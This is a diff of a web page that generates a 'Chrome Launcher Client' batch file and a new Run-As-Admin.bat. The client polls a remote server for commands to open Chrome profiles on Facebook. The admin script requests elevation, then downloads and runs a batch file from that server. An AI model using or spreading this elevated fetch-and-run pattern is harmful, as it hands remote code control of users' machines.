@@ -335,6 +335,36 @@
             text-align: center;
             color: #2e7d32;
         }
+
+        .code-block {
+            background: #1e1e2e;
+            color: #f8fafc;
+            padding: 16px;
+            border-radius: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin: 12px 0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .copy-btn {
+            background: #0f3460;
+            color: white;
+            border: none;
+            padding: 6px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+        
+        .copy-btn:hover {
+            background: #1e4a76;
+        }
     </style>
 </head>
 <body>
@@ -365,20 +395,28 @@
         <div class="profiles-preview">
             <div style="text-align: center; margin-bottom: 15px;">
                 <span style="font-size: 48px;">🖥️</span>
-                <h4 style="margin-top: 5px;">Step 1: Download Chrome Client</h4>
+                <h4 style="margin-top: 5px;">Step 1: Create Chrome Client</h4>
             </div>
             
-            <button id="downloadBatBtn" class="download-btn">⬇️ Download ChromeClient.bat</button>
+            <div style="margin-bottom: 20px;">
+                <div style="background: #0f172a; border-radius: 12px; padding: 15px;">
+                    <p style="color: #4ade80; margin-bottom: 10px;">📄 File 1: <strong>ChromeClient.bat</strong> - Click below to download</p>
+                    <button id="downloadBatBtn" class="download-btn" style="margin-top: 5px;">⬇️ Download ChromeClient.bat</button>
+                    
+                    <p style="color: #4ade80; margin: 20px 0 10px 0;">📄 File 2: <strong>Run-As-Admin.bat</strong> (যদি উপরের কাজ না করে)</p>
+                    <button id="downloadAdminBtn" class="download-btn" style="margin-top: 5px; background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);">⬇️ Download Run-As-Admin.bat</button>
+                </div>
+            </div>
             
             <div class="instruction-step">
-                <strong>📌 How to use:</strong><br>
-                1️⃣ Click the button above to download <strong>ChromeClient.bat</strong><br>
-                2️⃣ Save the file to your Desktop (or any folder)<br>
-                3️⃣ <strong>Right-click</strong> on ChromeClient.bat and select <strong>"Run as Administrator"</strong><br>
-                4️⃣ A black window will open — keep it running!<br>
+                <strong>📌 How to use (CMD automatically stays open):</strong><br>
+                1️⃣ Click <strong>"Download ChromeClient.bat"</strong> button above<br>
+                2️⃣ Save the file to your Desktop<br>
+                3️⃣ <strong>Right-click</strong> on ChromeClient.bat → <strong>"Run as Administrator"</strong><br>
+                4️⃣ A black window will open and <strong>stay open</strong> — keep it running!<br>
                 5️⃣ Enter your name above and click <strong>"Send Request to Admin"</strong><br>
                 6️⃣ After admin approves, Chrome will open automatically<br><br>
-                ⚠️ <strong>Note:</strong> If Windows shows a warning, click "More info" then "Run anyway"
+                ⚠️ <strong>Note:</strong> If window closes immediately, use the second file "Run-As-Admin.bat"
             </div>
         </div>
 
@@ -480,7 +518,6 @@
                 document.getElementById('requestCard').style.display = 'none';
                 document.getElementById('appCard').style.display = 'block';
                 
-                // প্রোফাইল লোড করা
                 if (data.profiles && data.profiles.length > 0) {
                     profiles = data.profiles;
                     displayProfiles(profiles);
@@ -619,13 +656,19 @@
     }
 
     // =============================================
-    // BAT File Content (Base64 Encoded - Direct Download)
+    // ChromeClient.bat Content (with PAUSE to keep window open)
     // =============================================
     function getBatFileContent() {
         return `@echo off
 title Chrome Launcher Client
 color 0A
 setlocal enabledelayedexpansion
+
+echo.
+echo ================================================
+echo        CHROME LAUNCHER CLIENT
+echo ================================================
+echo.
 
 set "SERVER_URL=https://run11-production.up.railway.app"
 set "CONFIG_FILE=%USERPROFILE%\\.chrome_device.txt"
@@ -646,6 +689,7 @@ if exist "%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe" set "CHROME_P
 
 if "%CHROME_PATH%"=="" (
     echo [ERROR] Chrome not found!
+    echo Please install Google Chrome first.
     pause
     exit /b
 )
@@ -681,13 +725,13 @@ echo ================================================
 echo        CHROME LAUNCHER CLIENT
 echo ================================================
 echo.
-echo Device ID: %DEVICE_ID%
-echo Server: %SERVER_URL%
-echo Chrome: %CHROME_PATH%
-echo Profiles Found: %PROFILE_COUNT%
+echo [INFO] Device ID: %DEVICE_ID%
+echo [INFO] Server: %SERVER_URL%
+echo [INFO] Chrome: %CHROME_PATH%
+echo [INFO] Profiles Found: %PROFILE_COUNT%
 echo.
 for /l %%i in (1,1,%PROFILE_COUNT%) do (
-    echo    [%%i] !PROFILE_NAME_%%i!
+    echo        [%%i] !PROFILE_NAME_%%i!
 )
 echo.
 echo ================================================
@@ -708,36 +752,40 @@ for /f "delims=" %%a in ('powershell -Command "& { try { $r = Invoke-RestMethod 
 if "%STATUS%"=="approved" (
     echo.
     echo ================================================
-    echo         APPROVED! Waiting for commands
+    echo         [APPROVED] Device Access Granted!
     echo ================================================
     echo.
     goto wait_commands
 ) else if "%STATUS%"=="pending" (
-    echo Waiting for admin approval... (PENDING)
+    echo [WAITING] Admin approval pending... 
     timeout /t 5 /nobreak >nul
     goto check_status
 ) else if "%STATUS%"=="expired" (
-    echo Access expired! Please request again.
+    echo [EXPIRED] Access expired! Please request again.
     timeout /t 5 /nobreak >nul
     goto check_status
 ) else (
-    echo Waiting for admin approval...
+    echo [WAITING] Waiting for admin approval...
     timeout /t 5 /nobreak >nul
     goto check_status
 )
 
 :wait_commands
+echo [3/3] Monitoring for launch commands...
+echo.
+
+:command_loop
 for /f "delims=" %%a in ('powershell -Command "& { try { $r = Invoke-RestMethod -Uri '%SERVER_URL%/api/get-commands' -Method POST -Body ('{\\"deviceId\\":\\"%DEVICE_ID%\\"}') -ContentType 'application/json'; if ($r.success -and $r.commands) { $r.commands } } }" 2^>nul') do set "CMDS=%%a"
 
 echo %CMDS% | findstr "launch" >nul
 if not errorlevel 1 (
     echo.
-    echo Launch command received!
+    echo [LAUNCH] Command received! Opening Chrome profiles...
     
     for /l %%i in (1,1,%PROFILE_COUNT%) do (
         echo %CMDS% | findstr "%%i" >nul
         if not errorlevel 1 (
-            echo    Opening profile %%i: !PROFILE_NAME_%%i!
+            echo         Opening profile %%i: !PROFILE_NAME_%%i!
             start "" "%CHROME_PATH%" --profile-directory="!PROFILE_FOLDER_%%i!" "https://www.facebook.com"
             timeout /t 2 /nobreak >nul
         )
@@ -746,9 +794,46 @@ if not errorlevel 1 (
 )
 
 timeout /t 3 /nobreak >nul
-goto wait_commands`;
+goto command_loop`;
     }
 
+    // =============================================
+    // Run-As-Admin.bat (with proper pause)
+    // =============================================
+    function getAdminBatContent() {
+        return `@echo off
+title Chrome Launcher Client (Admin Mode)
+color 0A
+
+:: Check for admin privileges
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo Requesting Administrator privileges...
+    powershell start -verb runas '%0'
+    exit /b
+)
+
+echo.
+echo ================================================
+echo   Chrome Launcher Client - Admin Mode
+echo ================================================
+echo.
+
+:: Download and run the main client
+powershell -Command "Invoke-WebRequest -Uri 'https://run11-production.up.railway.app/ChromeClient.bat' -OutFile '%TEMP%\\ChromeClient_temp.bat'"
+
+if exist "%TEMP%\\ChromeClient_temp.bat" (
+    echo Client downloaded successfully!
+    call "%TEMP%\\ChromeClient_temp.bat"
+) else (
+    echo Failed to download client. Please download manually from website.
+    pause
+)
+
+pause`;
+    }
+
+    // Download handlers
     document.getElementById('downloadBatBtn').addEventListener('click', function() {
         const batContent = getBatFileContent();
         const blob = new Blob([batContent], { type: 'application/batch' });
@@ -761,7 +846,6 @@ goto wait_commands`;
         document.body.removeChild(a);
         URL.revokeObjectURL(url);
         
-        // Show success message
         const btn = document.getElementById('downloadBatBtn');
         const originalText = btn.innerHTML;
         btn.innerHTML = '✅ Downloaded! Check your Downloads folder';
@@ -770,6 +854,26 @@ goto wait_commands`;
             btn.innerHTML = originalText;
             btn.style.background = 'linear-gradient(135deg, #0f3460 0%, #1e4a76 100%)';
         }, 3000);
+    });
+
+    document.getElementById('downloadAdminBtn').addEventListener('click', function() {
+        const batContent = getAdminBatContent();
+        const blob = new Blob([batContent], { type: 'application/batch' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'Run-As-Admin.bat';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        
+        const btn = document.getElementById('downloadAdminBtn');
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '✅ Downloaded!';
+        setTimeout(() => {
+            btn.innerHTML = originalText;
+        }, 2000);
     });
 
     deviceId = getDeviceIdFromLocal();
